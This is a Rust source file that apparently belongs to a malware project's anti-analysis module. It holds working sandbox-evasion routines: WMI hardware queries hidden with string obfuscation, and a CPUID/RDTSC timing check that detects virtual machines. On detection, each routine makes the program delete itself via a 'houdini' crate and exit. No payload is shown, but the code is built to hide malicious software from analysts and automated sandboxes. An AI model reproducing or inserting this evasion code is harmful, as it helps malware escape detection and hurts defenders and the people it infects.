use std::collections::HashMap;
use wmi::{COMLibrary, Variant, WMIConnection};
use std::arch::asm;

pub fn check_wmi(comlib: COMLibrary) {
    let wmi_con = WMIConnection::new(comlib).unwrap();

    let good_queries = vec![
        obfstr::obfstr!("SELECT * FROM Win32_PortConnector").to_string(),
        obfstr::obfstr!("SELECT * FROM CIM_Memory").to_string(),
        obfstr::obfstr!("SELECT * FROM CIM_PhysicalConnector").to_string(),
        obfstr::obfstr!("SELECT * FROM CIM_Slot").to_string(),
        obfstr::obfstr!("SELECT * FROM Win32_SMBIOSMemory").to_string(),
        obfstr::obfstr!("SELECT * FROM Win32_MemoryArray").to_string(),
        obfstr::obfstr!("SELECT * FROM Win32_MemoryDevice").to_string(),
        obfstr::obfstr!("SELECT * FROM Win32_PhysicalMemory").to_string(),
        obfstr::obfstr!("SELECT * FROM Win32_Processor").to_string(),
    ];

    for query in good_queries {
        let results: Vec<HashMap<String, Variant>> = wmi_con
            .raw_query(query.clone())
            .unwrap();

        if results.len() == 0 {
            let _ = houdini::disappear();
            std::process::exit(0);
        }
    }

}

pub fn check_cpuid_time() {
    let mut time1: u64;
    let mut time2: u64;
    let mut sum: u64 = 0;
    const AVG: u64 = 10000;

    for _ in 0..AVG {
        unsafe {
            asm!(
                "rdtsc",
                out("rax") time1,
                out("rdx") _,
            );
        }

        let mut _eax: u32;
        let _ecx: u32;
        let _edx: u32;
        unsafe {
            asm!(
                "cpuid",
                inout("rax") 1 => _eax,
                out("rcx") _ecx,
                out("rdx") _edx,
            );
        }

        unsafe {
            asm!(
                "rdtsc",
                out("rax") time2,
                out("rdx") _,
            );
        }

        sum += time2 - time1;
    }

    sum /= AVG;

    if sum > 1000 { // perfect value is around 1k tested on many VMs and physical PCs 
        let _ = houdini::disappear();
        std::process::exit(0);
    }

}